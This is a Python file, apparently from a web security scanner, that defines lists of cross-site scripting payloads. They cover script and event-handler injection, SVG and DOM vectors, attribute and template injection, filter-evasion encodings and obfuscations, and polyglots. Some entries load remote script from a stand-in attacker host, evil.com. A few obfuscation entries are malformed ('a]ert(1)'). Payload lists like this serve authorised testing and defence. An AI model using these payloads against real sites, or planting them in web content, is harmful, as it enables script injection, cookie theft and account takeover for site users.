"""
XSS Payloads - Reflected, Stored, DOM-based
Includes WAF bypass and polyglots
"""

XSS_PAYLOADS = {
    "basic": [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<iframe src='javascript:alert(1)'>",
        "<a href='javascript:alert(1)'>click</a>",
        "<div onmouseover=alert(1)>hover</div>",
    ],

    "event_handlers": [
        "<img src=x onerror=alert(1)>",
        "<img src=x onload=alert(1)>",
        "<body onload=alert(1)>",
        "<body onpageshow=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<input onblur=alert(1) autofocus><input autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<marquee onfinish=alert(1) loop=1>x</marquee>",
        "<object data=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<math><maction actiontype=statusline#http://google.com xlink:href=javascript:alert(1)>click",
        "<isindex action=javascript:alert(1) type=submit value=x>",
        "<form><button formaction=javascript:alert(1)>click",
        "<div style=width:100px;height:100px onmouseover=alert(1)>",
        "<div onmouseenter=alert(1)>",
        "<div onwheel=alert(1)>",
        "<div ondrag=alert(1)>",
        "<div contenteditable onpaste=alert(1)>paste here",
    ],

    "script_variations": [
        "<script>alert(1)</script>",
        "<script src=//evil.com/xss.js></script>",
        "<script>eval('alert(1)')</script>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<script>Function('alert(1)')()</script>",
        "<script>[].constructor.constructor('alert(1)')()</script>",
        "<script>window['alert'](1)</script>",
        "<script>this['alert'](1)</script>",
        "<script>self['alert'](1)</script>",
        "<script>top['alert'](1)</script>",
        "<script>parent['alert'](1)</script>",
        "<script>frames['alert'](1)</script>",
        "<script>window.alert(1)</script>",
        "<script>alert`1`</script>",
        "<script>alert?.('1')</script>",
        "<script>throw onerror=alert,1</script>",
        "<script>{onerror=alert}throw 1</script>",
        "<script>onerror=alert;throw 1</script>",
    ],

    "svg_payloads": [
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<svg onload=alert(1)//",
        "<svg onload=alert`1`>",
        "<svg><script>alert(1)</script>",
        "<svg><animate onbegin=alert(1)>",
        "<svg><set onbegin=alert(1)>",
        "<svg><handler onclick=alert(1)>click</handler>",
        "<svg><image xlink:href=x onerror=alert(1)>",
        "<svg><foreignObject><iframe srcdoc='<script>alert(1)</script>'>",
        "<svg><a xlink:href='javascript:alert(1)'><rect width=100 height=100></a>",
        "<svg><use xlink:href=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4=#x>",
    ],

    "dom_based": [
        "javascript:alert(1)",
        "javascript:alert(document.domain)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "#<script>alert(1)</script>",
        "#javascript:alert(1)",
        "?default=<script>alert(1)</script>",
        "'-alert(1)-'",
        "\\'-alert(1)//",
        "';alert(1)//",
        "\";alert(1)//",
    ],

    "attribute_injection": [
        "\" onmouseover=alert(1) \"",
        "' onmouseover=alert(1) '",
        "\" onfocus=alert(1) autofocus \"",
        "\" onclick=alert(1) \"",
        "\" onload=alert(1) \"",
        "\" onerror=alert(1) \"",
        "><script>alert(1)</script>",
        ">\"><script>alert(1)</script>",
        "\">\"><script>alert(1)</script>",
        "' onclick='alert(1)",
        "\" onclick=\"alert(1)",
        "x\" onmouseover=\"alert(1)",
    ],

    "href_src": [
        "javascript:alert(1)",
        "javascript:alert(document.domain)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "//evil.com/xss.js",
        "\\\\evil.com/xss.js",
    ],

    "template_injection": [
        "{{constructor.constructor('alert(1)')()}}",
        "{{7*7}}",
        "${alert(1)}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{alert(1)}}",
        "{{this.constructor.constructor('alert(1)')()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
    ],
}

XSS_WAF_BYPASS = {
    "case_variation": [
        "<ScRiPt>alert(1)</ScRiPt>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<scRIPT>alert(1)</scRIPT>",
        "<ScRiPt>AlErT(1)</ScRiPt>",
        "<IMG SRC=x OnErRoR=alert(1)>",
    ],

    "encoding": [
        "<script>alert(1)</script>",  # HTML entities
        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",  # Hex
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",  # Unicode
        "<script>\\u0061lert(1)</script>",
        "<script>\\x61lert(1)</script>",
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",  # URL encode
        "%253Cscript%253Ealert(1)%253C%252Fscript%253E",  # Double URL
        "&#60;script&#62;alert(1)&#60;/script&#62;",  # HTML decimal
        "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",  # HTML hex
    ],

    "tag_variations": [
        "<script>alert(1)</script>",
        "<script >alert(1)</script>",
        "<script\t>alert(1)</script>",
        "<script\n>alert(1)</script>",
        "<script\r>alert(1)</script>",
        "<script/>alert(1)</script>",
        "<script x>alert(1)</script>",
        "<script x=>alert(1)</script>",
        "<script x=x>alert(1)</script>",
        "<script/x>alert(1)</script>",
        "<script\x00>alert(1)</script>",
        "<script\x20>alert(1)</script>",
        "<script\x09>alert(1)</script>",
        "<script\x0A>alert(1)</script>",
        "<script\x0D>alert(1)</script>",
    ],

    "null_bytes": [
        "<scr\\x00ipt>alert(1)</scr\\x00ipt>",
        "<scr%00ipt>alert(1)</scr%00ipt>",
        "<script\\x00>alert(1)</script>",
        "<img src=x on\\x00error=alert(1)>",
    ],

    "comment_injection": [
        "<script>/**/alert(1)/**/</script>",
        "<script><!--\nalert(1)\n--></script>",
        "<scr<!--test-->ipt>alert(1)</scr<!--test-->ipt>",
    ],

    "alternative_tags": [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<object data=x onerror=alert(1)>",
        "<embed src=x onerror=alert(1)>",
        "<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>",
    ],

    "obfuscation": [
        "<script>a]ert(1)</script>",
        "<script>a]ert`1`</script>",
        "<script>eval('al'+'ert(1)')</script>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "<script>[]['filter']['constructor']('alert(1)')()</script>",
        "<script>window['al'+'ert'](1)</script>",
        "<script>top[/al/.source+/ert/.source](1)</script>",
        "<script>top[8680439..toString(30)](1)</script>",
    ],

    "without_parentheses": [
        "<script>alert`1`</script>",
        "<script>throw onerror=alert,1</script>",
        "<script>onerror=alert;throw 1</script>",
        "<script>{onerror=alert}throw 1</script>",
        "<img src=x onerror=alert`1`>",
        "<svg onload=alert&lpar;1&rpar;>",
        "<svg onload=alert&#40;1&#41;>",
    ],

    "without_spaces": [
        "<svg/onload=alert(1)>",
        "<img/src=x/onerror=alert(1)>",
        "<body/onload=alert(1)>",
        "<input/onfocus=alert(1)/autofocus>",
    ],
}

XSS_POLYGLOTS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "'\"-->]]>*/</script></style></title></textarea></noscript></template></select></form><img src=x onerror=alert(1)>",
    "javascript:/*-->*/ alert(1)/*\"'--></style></script>",
    "\"><img src=x onerror=alert(1)><\"",
    "'><img src=x onerror=alert(1)><'",
    "--><img src=x onerror=alert(1)><!--",
    "*/alert(1)/*",
    "'-alert(1)-'",
    "\\'-alert(1)//",
    "</script><script>alert(1)</script>",
    "<img src=x:x onerror=alert(1)>",
    "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
    "<!--<img src=\"--><img src=x onerror=alert(1)//\">",
    "<style><img src=\"</style><img src=x onerror=alert(1)//\">",
]

# Context-specific payloads
XSS_BY_CONTEXT = {
    "html_text": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
    ],
    "html_attribute": [
        "\" onmouseover=alert(1) x=\"",
        "' onmouseover=alert(1) x='",
        "\" onfocus=alert(1) autofocus \"",
    ],
    "html_attribute_unquoted": [
        " onmouseover=alert(1) ",
        " onfocus=alert(1) autofocus ",
    ],
    "script_string": [
        "';alert(1)//",
        "\";alert(1)//",
        "</script><script>alert(1)</script>",
    ],
    "script_number": [
        "-alert(1)-",
        "/alert(1)//",
    ],
    "url": [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ],
    "css": [
        "expression(alert(1))",
        "url('javascript:alert(1)')",
    ],
}
